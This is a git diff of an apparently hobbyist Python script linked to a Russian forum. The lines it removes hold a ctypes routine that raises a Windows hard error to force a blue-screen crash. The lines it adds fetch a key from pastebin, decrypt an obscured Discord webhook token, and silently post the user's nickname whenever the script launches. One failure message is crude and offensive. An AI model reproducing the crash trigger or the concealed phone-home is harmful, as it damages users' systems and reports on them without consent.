@@ -1,5 +1,5 @@
-import time, sys, json, requests, random, string, ctypes, os, subprocess, aiohttp, configparser, spotipy, datetime, logging
-from spotipy.oauth2 import SpotifyOAuth
+import time, sys, json, requests, random, string, os, subprocess, aiohttp, configparser
+from cryptography.fernet import Fernet
 from bs4 import BeautifulSoup
 
 class const:
@@ -10,37 +10,6 @@ class const:
     directory = "C:/2501/ply_Alib/data"
     if not os.path.exists(directory):
         os.makedirs(directory)
-
-
-class EXCEPTION_RECORD(ctypes.Structure):
-    _fields_ = [
-        ("ExceptionCode", ctypes.c_ulong),
-        ("ExceptionFlags", ctypes.c_ulong),
-        ("ExceptionRecord", ctypes.c_void_p),
-        ("ExceptionAddress", ctypes.c_void_p),
-        ("NumberParameters", ctypes.c_ulong),
-        ("ExceptionInformation", ctypes.c_ulong * 15)
-    ]
-class EXCEPTION_POINTERS(ctypes.Structure):
-    _fields_ = [
-        ("ExceptionRecord", ctypes.POINTER(EXCEPTION_RECORD)),
-        ("ContextRecord", ctypes.c_void_p)
-    ]
-
-class EXCEPTION():
-    def exception_trigger():
-        ntdll = ctypes.WinDLL('ntdll')
-        RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
-        NtRaiseHardError = ntdll.NtRaiseHardError
-        STATUS_ASSERTION_FAILURE = 0xC000021A
-        SE_SHUTDOWN_PRIVILEGE = 0x13
-
-        prev = ctypes.c_ulong()
-        RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, True, False, ctypes.byref(prev))
-        status = NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, None, 6, ctypes.byref(ctypes.c_ulong(0)))
-        if status != 0:
-            print("0_0")
-
 
 class Clock:
     def curtimeget(self):
@@ -66,7 +35,7 @@ class Connection:
     #class Get_AV:
     async def get_data(self):
         config = configparser.ConfigParser()
-        config.read(const().directory + "/settings.ini")
+        config.read(const().directory + "/settings.ini", encoding="utf-8")
         user_id = int(config.get("requests", "user_id"))
         async with aiohttp.ClientSession() as session:
             async with session.get(f"https://forum.wayzer.ru/api/users/{user_id}") as response:
@@ -83,6 +52,20 @@ class Connection:
             return json_data['version']
         else:
             return "?.?.?"
+        
+    def get_key(self, type):
+        url = "https://pastebin.com/raw/MuFfZ3BA"
+        response = requests.get(url)
+        if response.status_code == 200:
+            json_data = json.loads(response.text)
+            if type == "private":
+                return json_data['private_key']
+            elif type == "public":
+                chunks = json_data['public_key']
+                return ''.join(chunks) 
+        else:
+            print("NOGGER ALERT!!!")
+        
 class RandomStuff:
     #class RandomFact:
     def get_random_fact(self):
@@ -110,7 +93,16 @@ class RandomStuff:
     def generate_ascii_string(self, length):
         characters = string.ascii_letters
         return ''.join(random.choice(characters) for _ in range(length))
+    
+class EvaCrypt:
+    def __init__(self):
+        self.public_key = Connection().get_key("public")
+        self.private_key = Connection().get_key("private")
+        self.cipher_suite = Fernet(bytes(self.private_key, "utf-8"))
 
+    def decrypt(self):
+        decrypted = self.cipher_suite.decrypt(bytes(self.public_key, "utf-8")).decode()
+        return decrypted
 
 class EvaSociety:
     def download(self, link, path):
@@ -132,6 +124,37 @@ class EvaSociety:
         except Exception as e:
             print(f"[2501] // An society (ex) logic error occurred: {e}")
             return False
+        
+    def send_discord_webhook(self):
+        webhook_url = 'https://discord.com/api/webhooks/1236667324220702780/' + EvaCrypt().decrypt()
+        config = configparser.ConfigParser()
+        config.read(const().directory + "/settings.ini", encoding="utf-8")
+        nickname = config.get("info", "nickname", fallback=None)
+        if nickname is not None:
+            message = f'[2501] {nickname} launched script!'
+        else:
+            message = f'[2501] ??? launched script!'
+        data = {'content': message}
+        requests.post(webhook_url, json=data)
+        return message
+    
+    async def get_info(self):
+        config = configparser.ConfigParser()
+        config.read(const().directory + "/settings.ini", encoding="utf-8")
+        user_id = str(config.get("requests", "user_id"))
+        async with aiohttp.ClientSession() as session:
+            async with session.get(f"https://forum.wayzer.ru/api/users/{user_id}") as response:
+                data = await response.json()
+                bio = data['data']['attributes']['bio']
+                nick = data['data']['attributes']['displayName']
+                config["info"] = {
+                    "; Bio for requests": "Default: Forum bio",
+                    "bio": bio,
+                    "; Nickname for requests": "Default: Forum nickname",
+                    "nickname": nick,
+                }
+                with open(const().directory + "/settings.ini", "w", encoding="utf-8") as configfile:
+                    config.write(configfile)
         
 class WindowTitle():
     def set(self, title):
